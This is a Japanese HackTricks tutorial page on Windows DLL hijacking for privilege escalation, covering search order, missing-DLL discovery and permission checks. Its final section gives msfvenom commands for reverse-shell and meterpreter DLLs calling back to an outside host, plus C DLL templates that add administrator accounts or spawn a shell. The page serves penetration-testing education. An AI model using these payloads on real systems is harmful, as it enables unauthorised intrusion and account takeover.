# Dll Hijacking

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksに広告を掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をご確認ください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ハッキングキャリア**に興味があり、ハッキングできないものをハッキングしたい方は、**採用中です！** (_流暢なポーランド語の読み書きが必要です_).

{% embed url="https://www.stmcyber.com/careers" %}

## 定義

まず、定義から始めましょう。DLLハイジャックとは、広義には、**正当な/信頼されたアプリケーションに任意のDLLをロードさせること**です。_DLL Search Order Hijacking_、_DLL Load Order Hijacking_、_DLL Spoofing_、_DLL Injection_、_DLL Side-Loading_などの用語がしばしば -誤って- 同じ意味で使われます。

Dllハイジャックは、**コードを実行**し、**永続性を獲得**し、**権限を昇格**させるために使用されます。これら3つの中で**最も見つけにくい**のは、**権限昇格**です。しかし、これは権限昇格セクションの一部であるため、このオプションに焦点を当てます。また、目標に関係なく、dllハイジャックは同じ方法で実行されることに注意してください。

### タイプ

選択肢は多様で、成功はアプリケーションが必要なDLLをロードするように設定されているかによって異なります。可能なアプローチには以下が含まれます：

1. **DLLの置き換え**：正当なDLLを悪意のあるDLLに置き換える。これは_DLL Proxying_と組み合わせることができ、元のDLLのすべての機能が保持されることを保証します。
2. **DLL検索順序のハイジャック**：アプリケーションによってパスなしで指定されたDLLは、特定の順序で固定された場所で検索されます。検索順序のハイジャックは、実際のDLLよりも前に検索される場所に悪意のあるDLLを配置することによって行われます。これには、対象アプリケーションの作業ディレクトリが含まれることがあります。
3. **ファントムDLLハイジャック**：正当なアプリケーションがロードしようとする欠落している/存在しないDLLの代わりに悪意のあるDLLを配置します。
4. **DLLのリダイレクト**：DLLが検索される場所を変更する。例えば、悪意のあるDLLを含むフォルダーを指定するために、`%PATH%`環境変数を編集するか、`.exe.manifest` / `.exe.local`ファイルを編集します。
5. **WinSxS DLLの置き換え**：対象のDLLの関連するWinSxSフォルダー内の正当なDLLを悪意のあるDLLに置き換える。これはしばしばDLLサイドローディングと呼ばれます。
6. **相対パスDLLハイジャック**：正当なアプリケーションをユーザーが書き込み可能なフォルダーにコピー（およびオプションで名前を変更）し、悪意のあるDLLと一緒に配置します。これは使用方法によっては、(署名された)バイナリプロキシ実行と類似しています。これの変種は、正当なアプリケーションを悪意のあるDLLと一緒に持ち込む（被害者のマシン上の正当な場所からコピーするのではなく）という、やや矛盾した「_bring your own LOLbin_」と呼ばれることがあります。

## 不足しているDllを見つける

システム内の不足しているDllを見つける最も一般的な方法は、sysinternalsから[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、**次の2つのフィルターを設定する**ことです：

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

そして、**ファイルシステムアクティビティ**だけを表示します：

![](<../../.gitbook/assets/image (314).png>)

一般に**不足しているdllを探している場合**は、これを**数秒間実行**しておきます。\
特定の実行可能ファイル内の**不足しているdllを探している場合**は、**"Process Name" "contains" "\<exec name>"のような**別のフィルターを設定し、実行してからイベントのキャプチャを停止します。

## 不足しているDllを悪用する

権限を昇格させるためには、特権プロセスがロードしようとするdllを書き込むことができる最良のチャンスがあります。したがって、dllが検索される前にフォルダーにdllを**書き込む**ことができるか、元のdllが存在しないフォルダーにdllが検索される場所に**書き込む**ことができます。

### Dll検索順序

[**Microsoftドキュメント**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)内で、Dllが具体的にどのようにロードされるかを見ることができます。

一般的に、**Windowsアプリケーション**は**事前に定義された検索パスを使用してDLLを見つけ**、これらのパスを特定の順序でチェックします。DLLハイジャックは通常、これらのフォルダーのいずれかに悪意のあるDLLを配置し、そのDLLが正当なものよりも先に見つかるようにすることで発生します。この問題は、アプリケーションが必要なDLLの絶対パスを指定することで軽減できます。

以下に32ビットシステムでの**DLL検索順序**を示します：

1. アプリケーションがロードされたディレクトリ。
2. システムディレクトリ。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)関数を使用します。（_C:\Windows\System32_）
3. 16ビットシステムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索されます。（_C:\Windows\System_）
4. Windowsディレクトリ。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)関数を使用します。
1. (_C:\Windows_)
5. 現在のディレクトリ。
6. PATH環境変数にリストされているディレクトリ。これには、**App Paths**レジストリキーによって指定されたアプリケーションごとのパスは含まれません。**App Paths**キーはDLL検索パスを計算するときには使用されません。

これが**SafeDllSearchMode**が有効になっているときの**デフォルト**の検索順序です。無効になっている場合、現在のディレクトリが2番目に昇格します。この機能を無効にするには、**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**レジストリ値を作成し、0に設定します（デフォルトは有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)関数が**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**で呼び出されると、検索は**LoadLibraryEx**がロードしている実行可能モジュールのディレクトリから始まります。

最後に、**dllは絶対パスを指定してロードされることがあります**。その場合、そのdllは**そのパスでのみ検索されます**（dllに依存関係がある場合、それらは名前だけでロードされたかのように検索されます）。

検索順序を変更する他の方法がありますが、ここでは説明しません。

#### Windowsドキュメントからのdll検索順序の例外

* **同じモジュール名のDLLがすでにメモリにロードされている場合**、システムはリダイレクトとマニフェストのみをチェックし、DLLがどのディレクトリにあるかに関係なく、ロードされたDLLに解決します。**システムはDLLを検索しません**。
* DLLがアプリケーションが実行されているWindowsのバージョンの**既知のDLLのリスト**にある場合、システムはDLLを検索する代わりに既知のDLLのコピーを使用します（および既知のDLLの依存するDLLがある場合はそれらも）。現在のシステムの既知のDLLのリストについては、次のレジストリキーを参照してください：**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**。
* **DLLに依存関係がある場合**、システムは依存するDLLをモジュール名だけでロードされたかのように**検索します**。これは、最初のDLLが完全なパスを指定してロードされた場合でも当てはまります。

### 権限の昇格

**必要条件**：

* **他の権限で実行される/実行されるプロセスを見つける**（水平/横方向の移動）**dllが不足している**。
* dllが検索される**任意のフォルダー**に**書き込み権限**を持っている（おそらく実行可能ファイルのディレクトリまたはシステムパス内のいくつかのフォルダー）。

はい、必要条件は見つけるのが難しいです。**デフォルトでは、dllが不足している特権実行可能ファイルを見つけるのはかなり奇妙**であり、システムパスフォルダーに書き込み権限を持っていることは**さらに奇妙**です（デフォルトではできません）。しかし、設定が誤っている環境ではこれが可能です。\
幸運にも要件を満たしている場合は、[UACME](https://github.com/hfiref0x/UACME)プロジェクトをチェックできます。**プロジェクトの主な目的はUACをバイパスすることですが**、書き込み権限を持つフォルダーのパスを変更するだけで使用できるWindowsバージョンのDllハイジャックの**PoC**を見つけることができます。

フォルダー内の権限を**確認するには**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
And **PATH内のすべてのフォルダーの権限を確認します**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
実行可能ファイルのインポートとdllのエクスポートを以下で確認することもできます：
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
以下は、特権を昇格させるために **Dll Hijackingを悪用する** 完全なガイドです。**System Pathフォルダー**に書き込み権限がある場合は、以下を確認してください：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### 自動化ツール

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、システムPATH内の任意のフォルダーに書き込み権限があるかどうかをチェックします。
この脆弱性を発見するための他の興味深い自動化ツールには、**PowerSploit関数**があります：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_。

### 例

悪用可能なシナリオを見つけた場合、成功裏に悪用するための最も重要なことの一つは、**実行可能ファイルがそれからインポートするすべての関数をエクスポートするdllを作成する**ことです。とにかく、Dll Hijackingは[Medium IntegrityレベルからHigh **(UACをバイパスして)**](../authentication-credentials-uac-and-efs.md#uac)昇格するため、または[**High IntegrityからSYSTEM**](./#from-high-integrity-to-system)**へ昇格するために便利です。** 有効なdllの作成方法の例は、実行のためのdllハイジャックに焦点を当てたこのdllハイジャック研究内で見つけることができます： [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**
さらに、**次のセクション**では、**基本的なdllコード**のいくつかを見つけることができます。これらは**テンプレート**として、または**必要ない関数をエクスポートするdllを作成する**ために役立つかもしれません。

## **Dllの作成とコンパイル**

### **Dllプロキシ化**

基本的に**Dllプロキシ**は、ロードされたときに**悪意のあるコードを実行する**能力を持つと同時に、**実際のライブラリへのすべての呼び出しをリレーすることで**、**期待されるように**機能するDllです。

ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) または [**Spartacus**](https://github.com/Accenture/Spartacus) を使用すると、実際に**実行可能ファイルを指定してプロキシ化したいライブラリを選択し**、**プロキシ化されたdllを生成する**か、**Dllを指定してプロキシ化されたdllを生成する**ことができます。

### **Meterpreter**

**リバースシェルを取得する (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**メータープリター (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する（x86版のみ、x64版は見当たらない）：**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自作

いくつかのケースでは、コンパイルしたDllは、被害者プロセスによってロードされる**いくつかの関数をエクスポート**する必要があります。これらの関数が存在しない場合、**バイナリはそれらをロードできず**、**エクスプロイトは失敗します**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
```markdown
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ハッキングキャリア**に興味があり、ハック不可能をハックしたい方 - **採用情報！** (_流暢なポーランド語の読み書きが必要です_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
```
